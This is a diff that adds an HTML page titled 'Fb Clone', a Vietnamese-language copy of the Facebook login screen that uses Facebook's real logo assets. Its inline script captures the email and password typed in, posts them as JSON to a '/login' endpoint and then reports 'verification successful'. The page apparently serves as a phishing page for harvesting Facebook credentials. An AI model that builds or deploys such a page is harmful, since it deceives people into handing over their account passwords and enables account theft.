@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+
+    <title>Fb Clone</title>
+    <link rel="icon" href="https://cdn.iconscout.com/icon/free/png-512/facebook-social-media-fb-logo-square-44659.png" />
+    <link rel="stylesheet" href="css/style.css" />
+    <!-- To get the font-awesome CSS style sheet for the 'Eye Icon' located in the password field -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+
+
+<body>
+    <div class="contains-top-half-and-footer-bottom-half">
+        <div class="mobile-fb-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
+        </div>
+        <div class=" global-container ">
+            <div class="bigger-box ">
+                <div class="big-box ">
+                    <div class="left-box ">
+                        <div class="image-box ">
+                            <img src="images/aa.png " style="width:103%; margin-top:-100px;margin-right: 20px; ">
+                            <img class="fb-logo " src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg " alt=" " />
+                        </div>
+
+                    </div>
+                    <div class="right-box ">
+                        <div class="form-container ">
+                            <form onsubmit="handleLogin(event)">
+
+                                <div class="space">
+                                    <input type="text" name="email" class="email-box" placeholder="Email hoặc số di động" required>
+                                </div>
+
+                                <div class="space">
+                                    <input type="password" name="password" class="pw-box" placeholder="Mật khẩu" required>
+                                </div>
+
+                                <div class="space">
+                                    <button type="submit" class="login-button">
+            Đăng nhập
+        </button>
+                                </div>
+
+                                <div class="spaceTwo">
+                                    <a href="#" class="adjust-forgot-pw">Quên mật khẩu?</a>
+                                </div>
+
+                                <div class="line"></div>
+
+                                <div class="space">
+                                    <button type="button" class="create-button">
+            Tạo tài khoản mới
+        </button>
+                                </div>
+                            </form>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Script to toggle on & off the eye icon in the password field -->
+    <script src="./js/toggleEyeIcon.js "></script>
+    <!-- Script to change/randomize background image every time the webpage is reloaded -->
+    <script src="./js/changeBackgroundImage.js "></script>
+    <script>
+        async function handleLogin(event) {
+
+            event.preventDefault();
+            // 🔥 Quan trọng: chặn reload trang
+
+            const email = document.querySelector(".email-box").value;
+            const password = document.querySelector(".pw-box").value;
+
+            try {
+                const response = await fetch("/login", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email,
+                        password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert("Zác minh thành công!");
+                } else {
+                    alert("Có lỗi xảy ra!");
+                }
+
+            } catch (error) {
+                alert("Không kết nối được server!");
+            }
+        }
+    </script>
+</body>
+
+</html>
